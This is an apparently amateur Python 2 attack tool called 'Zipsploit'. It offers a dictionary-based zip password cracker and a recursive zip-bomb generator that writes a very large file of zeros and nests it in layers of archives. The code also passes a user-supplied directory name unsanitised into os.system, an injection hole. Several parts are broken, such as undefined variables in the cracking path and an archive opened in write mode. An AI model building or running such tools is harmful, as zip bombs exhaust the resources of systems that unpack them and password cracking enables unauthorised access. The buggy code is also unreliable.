# -*- coding: utf-8 -*-
from __future__ import unicode_literals

import zipfile
from time import time
import subprocess
import threading
import getopt
import os
import sys
import gzip
m_dir = ""
file_n = ""
command = False
zbomb = False
parse = False
ssh_c = False
level = 0
text_f = ""
gz = False
def usage():
	print "test version Zipsploit"
	print
	print " '-f' --file_n = file_n -----open/created files"
	print 
	print "'-m' --m_dir = m_dir --------make diretory"
	print
	print "'-m' --m_dir = m_dir --------make diretory"
	print
	print "'-p' --parse = parse --------zip password cracker"
	print 
	print "'-z' --zbomb = zbomb ----------zip bomb"
	print
	print " '-g' --gz = gz -----convert in gzip format"
	print
	print 
	print "'-e' --exploit --------------This is a main tools  for more of zip-libraries////// on the development/////"
	sys.exit(0)

	
upload = False
init_z = False
class Patch_f(object):
	def __init__(self,p_dir,p_file):
		self.p_file = p_file
		self.p_dir = p_dir
	def __str__(self):
		return str(self.p_dir)+'/'+str(self.p_file)
	def o_file(self):
		try:
			os.chdir(self.p_dir)
			zObj = zipfile.ZipFile(self.p_file,mode='w')
			pr = zObj.namelist()
			print pr
			zObj.close()
		except zipfile.BadZipfile:
			print "[!!!] Error opening your zip file"
			return
	def Brute(self):
		os.chdir(self.p_dir)
		passwd = ''
		timeStart = time()
		with open("passwd_list.txt", "r") as fl:
			string = fl.readlines()
			for i, val in enumerate(string):
				passwd= val.strip()
				try:
					z_obj = o_file.zObj
					z_obj.extractall(pwd = passwd)
					pTime = time() - timeStart
					print "\nPassword cracked: %s\n" %passwd
					print "%i password attempts per second." %(i/pTime)
					return
				except Exception as err:
					if str(err[0])=='Bad password for file':
						pass
					elif 'decompressing' in str(err[0]):
						pass
					else:
						print err
			print "Sorry, password not found."

def gen_f(inp,size=100):
			with open(inp, 'w') as gen:
				map(gen.write((size*1024*1024)*'0'),range(1024))

def compress_file(inp,out,mode='w'):
	try:
		with zipfile.ZipFile(inp, mode ,allowZip64= True) as zf:
			zf.write(out, compress_type=zipfile.ZIP_DEFLATED)
			zf.close()
	except zipfile.BadZipfile:
			print "[!!!] Error opening your zip file"
	return inp	

def create_file(stack,inp,out):  #stack = map(lambda x: "%d.zip"%x,range(10))
		if stack:
			x = stack.pop()
			with zipfile.ZipFile(x, 'w' ,allowZip64= True) as zf:
				zf.write(out, compress_type=zipfile.ZIP_DEFLATED)
				zf.close()
				f = compress_file(inp,x,mode='a')
				os.remove(x)
				return create_file(stack,inp,f)
		else:
				return inp	
def gz_convert(inp):
	with file(inp,'rb')	as f1:
		out_g=f1.read()
		f1.close()
	outG = gzip.GzipFile("%s.gz"%inp, 'wb')			
	outG.write(out_g)
	outG.close()		
			
def main():
	global m_dir
	global file_n
	global command
	global zbomb
	global parse
	global level
	global text_f
	global gz
	print """
	======================================================
	++++++++++++++++++++++++++++++++++++++++++++++++++++++|
	||###$###############################################||
	||+++++$$$$$$$$$$$##$++&&&&&&&&&&&&++$$$$$$$$$$$+++++||		
	||++++++++++++++$##++++++++&&&+++++++$$++++++++$$++++||
	||+++++++++++##$##+++++++++&&&+++++++$$++++++++$$++++||
	||++++++++$###+++++++++++++&&&+++++++$$$$$$$$$$$+++++||
	||++++++####+++++++++++++++&&&+++++++$$$$$$$$$/++++++||
	||++++###++++++++++++++++++&&&+++++++$$++++++++++++++||
	||++++###############++&&&&&&&&&&&&++$$++++++++++++++||
	||++++##############&++&&&&&&&&&&&&++$$++++++++++++++||
	||+++++++++++++++++++++++++++++++++++++++++++++++++++||	
	||+++++++++++++++++++++++++++++++++++++++++++++++++++||
	||+//////////////////////////////////////////////////||
	||&&&&&&&&&+++&&&&&&++&&+++++/@@@@\+++&&&&++&&&&&&&&&||
	||&&+++++@@+++&&//&&++&&++++|@@//@@|+++&&+++++++&&+++||
	||+++++@@@@+++&&//&&++&&++++|@////@|+++&&+++++++&&+++||
	||@@@@@+++&+++&&&&&+++&&++++|@////@|+++&&+++++++&&+++||
	||@@++++++++++&&++++++&&___+|@@//@@|+++&&+++++++&&+++||
	||@@@@@@@@@+++&&++++++&&&&&++\@@@@/+++&&&&++++++&&+++||
	++++++++++++++++++++++++++++++++++++++++++++++++++++++|
	======================================================
	"""

	param = ["help","m_dir","file_n","zbomb","parse","command"]
	if not len(sys.argv[1:]):
		usage()
	try:
		opts,args = getopt.getopt(sys.argv[1:],"h:m:f:zp:tg:l:c:",param)	#i like hentai
	except getopt.GetoptError as err:
		print(str(err))
		usage()
	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-m", "--m_dir"):
			m_dir = a
		elif o in ("-f", "--file_n"):
			file_n = a
		elif o in ("-z", "--zbomb"):
			zbomb = True
		elif o in ("-p", "--parse"):
			parse = True
		elif o in ("-t", "--text"):
			text_f = a
		elif o in ("-l", "--level"):
			level = int(a)
		elif o in ("-g", "--gz"):
			gz = True		
		elif o in ("-c", "--command"):
			command = True
		else:
			assert False,"Unhandled Option"
	if m_dir:
		x = str(m_dir)
		os.system(u'mkdir %s'%x) 
		os.system(u'cd %s'%x) 
		print os.getcwd()	     #make directory,but don't started
	if file_n and not zbomb and not parse:
		f_name = file_n			#make file
		x = os.getcwd()
		zInit = Patch_f(x,f_name)
		zInit.o_file()
		usage()
	if parse:			#oooh... this is f#cking shit)
		try:
			x = sys.argv[1]
			f_name = sys.argv[2]
			zInit = Patch_f(x,y)
			zInit.Brute()
		except Exception as e:
			print e
			usage()
	if zbomb:
		if len(file_n)>0:
			f_name= file_n
		if len(text_f)>0:
			t_f = text_f
		if level>0:
			levelf=level
		else:
			f_name=sys.argv[2]
			t_f = sys.argv[3]
			levelf = int(sys.argv[4])
		gen_f(t_f)
		compress_f = compress_file('%s.zip'%f_name,t_f)
		stack = map(lambda x: "%d.zip"%x,range(levelf))
		create_file(stack,'%s.zip'%f_name,compress_f)	
	
	if gz is True:
		if len(file_n)>0:
			f_name= file_n
		else:
			f_name=sys.argv[2]
			gz_convert(f_name)



		

if __name__ == '__main__':
	main()

